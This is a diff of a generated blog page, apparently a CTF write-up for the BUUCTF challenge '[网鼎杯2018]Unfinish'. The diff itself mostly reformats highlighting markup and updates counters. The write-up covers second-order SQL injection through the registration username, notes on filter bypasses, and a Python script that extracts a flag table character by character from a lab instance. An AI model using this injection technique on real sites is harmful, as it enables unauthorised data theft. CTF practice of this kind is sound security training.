@@ -318,8 +318,8 @@
     <h2 id="网鼎杯2018unfinish">[网鼎杯2018]Unfinish</h2>
 <p>二次注入，注入点是在register.php传入的username中。</p>
 <p>1.猜测语句</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#ff79c6">insert</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">values</span> (<span style="color:#f1fa8c">&#39;email&#39;</span>,<span style="color:#f1fa8c">&#39;username&#39;</span>,<span style="color:#f1fa8c">&#39;password&#39;</span>)
-</code></pre></div><p>2.表名是猜的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff79c6">insert</span> <span style="color:#ff79c6">table</span> <span style="color:#ff79c6">values</span> (<span style="color:#f1fa8c">&#39;email&#39;</span>,<span style="color:#f1fa8c">&#39;username&#39;</span>,<span style="color:#f1fa8c">&#39;password&#39;</span>)
+</span></span></code></pre></div><p>2.表名是猜的</p>
 <p>过滤了information</p>
 <p>mysql版本是<strong>5.5.64</strong>，sys 库在<strong>MySQL5.6</strong>或更高版本才有。</p>
 <p>3.每次都需要注意换邮箱</p>
@@ -327,27 +327,27 @@
 <p>要用from for</p>
 <p>5.+如果被识别成空格，可以用%2B。
 用异或也可以实现</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
-<span style="color:#ff79c6">from</span> bs4 <span style="color:#ff79c6">import</span> BeautifulSoup
-<span style="color:#ff79c6">import</span> re
-
-url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://3facbb99-4fb4-44fa-8fae-fa28575f788a.node4.buuoj.cn:81/&#39;</span>
-a <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
-<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">60</span>):
-    email <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;eqwews1@131416024w&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)
-    <span style="color:#6272a4">#insert table values (&#39;email&#39;,&#39;username&#39;,&#39;password&#39;)</span>
-    payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;0&#39; + ascii(substr((select * from flag) from &#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34; for 1))+&#39;0&#34;</span>
-    register <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;email&#39;</span>:email,<span style="color:#f1fa8c">&#39;username&#39;</span>:payload,<span style="color:#f1fa8c">&#39;password&#39;</span>:<span style="color:#f1fa8c">&#39;0&#39;</span>}
-    login <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;email&#39;</span>:email,<span style="color:#f1fa8c">&#39;password&#39;</span>:<span style="color:#f1fa8c">&#39;0&#39;</span>}
-    r1 <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;register.php&#39;</span>,data <span style="color:#ff79c6">=</span> register)
-    r2 <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;login.php&#39;</span>, data <span style="color:#ff79c6">=</span> login,allow_redirects<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
-    soup <span style="color:#ff79c6">=</span> BeautifulSoup(r2<span style="color:#ff79c6">.</span>text,<span style="color:#f1fa8c">&#39;html.parser&#39;</span>)
-    a<span style="color:#ff79c6">+=</span><span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(soup<span style="color:#ff79c6">.</span>span<span style="color:#ff79c6">.</span>string<span style="color:#ff79c6">.</span>strip()))
-    <span style="color:#8be9fd;font-style:italic">print</span>(a)
-
-<span style="color:#6272a4">#print(soup.find_all(&#39;span&#39;))</span>
-<span style="color:#6272a4">#print(re.findall(&#34;.*?&lt;/span&gt;&#34;,r2.text)[0].replace(&#39;&lt;/span&gt;&#39;,&#39;&#39;).strip(),end=&#39;&#39;) 不用bs4用re硬找</span>
-</code></pre></div><h2 id="heading"></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> bs4 <span style="color:#ff79c6">import</span> BeautifulSoup
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://3facbb99-4fb4-44fa-8fae-fa28575f788a.node4.buuoj.cn:81/&#39;</span>
+</span></span><span style="display:flex;"><span>a <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">60</span>):
+</span></span><span style="display:flex;"><span>    email <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;eqwews1@131416024w&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#insert table values (&#39;email&#39;,&#39;username&#39;,&#39;password&#39;)</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;0&#39; + ascii(substr((select * from flag) from &#34;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34; for 1))+&#39;0&#34;</span>
+</span></span><span style="display:flex;"><span>    register <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;email&#39;</span>:email,<span style="color:#f1fa8c">&#39;username&#39;</span>:payload,<span style="color:#f1fa8c">&#39;password&#39;</span>:<span style="color:#f1fa8c">&#39;0&#39;</span>}
+</span></span><span style="display:flex;"><span>    login <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;email&#39;</span>:email,<span style="color:#f1fa8c">&#39;password&#39;</span>:<span style="color:#f1fa8c">&#39;0&#39;</span>}
+</span></span><span style="display:flex;"><span>    r1 <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;register.php&#39;</span>,data <span style="color:#ff79c6">=</span> register)
+</span></span><span style="display:flex;"><span>    r2 <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;login.php&#39;</span>, data <span style="color:#ff79c6">=</span> login,allow_redirects<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+</span></span><span style="display:flex;"><span>    soup <span style="color:#ff79c6">=</span> BeautifulSoup(r2<span style="color:#ff79c6">.</span>text,<span style="color:#f1fa8c">&#39;html.parser&#39;</span>)
+</span></span><span style="display:flex;"><span>    a<span style="color:#ff79c6">+=</span><span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">int</span>(soup<span style="color:#ff79c6">.</span>span<span style="color:#ff79c6">.</span>string<span style="color:#ff79c6">.</span>strip()))
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(a)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#print(soup.find_all(&#39;span&#39;))</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#print(re.findall(&#34;.*?&lt;/span&gt;&#34;,r2.text)[0].replace(&#39;&lt;/span&gt;&#39;,&#39;&#39;).strip(),end=&#39;&#39;) 不用bs4用re硬找</span>
+</span></span></code></pre></div><h2 id="heading"></h2>
 
 </section>
 
@@ -500,6 +500,8 @@ a <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</s
 
     
 
+    
+
 
 <script>
 (function(u, c) {
@@ -519,7 +521,7 @@ a <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</s
             2020 - 
         
         2022 <a href="https://stack-theme-mod.vercel.app/">茄子的养殖场</a>·<i class="fas fa-bell"></i> <a id="days">0</a>Days<br>
-      共书写了33.2k字·共 29篇文章</br><span><p>
+      共书写了33.5k字·共 30篇文章</br><span><p>
     </section>
     
     <section class="powerby">
@@ -688,7 +690,7 @@ document.getElementById('days').innerHTML = number_of_days;
         <div class="category-list">
             <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-list-link">学习笔记<span class="category-list-count">24</a>
             </span></div>
-            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/" class="category-list-link">小人联合工会内部资料<span class="category-list-count">1</a>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A%E5%86%85%E9%83%A8%E8%B5%84%E6%96%99/" class="category-list-link">小人联合工会内部资料<span class="category-list-count">2</a>
             </span></div>
             <div class="category-list-item"><a href="https://proben1.github.io/categories/%E6%95%B4%E7%82%B9%E5%B0%8F%E6%B4%BB/" class="category-list-link">整点小活<span class="category-list-count">4</a>
             </span></div>
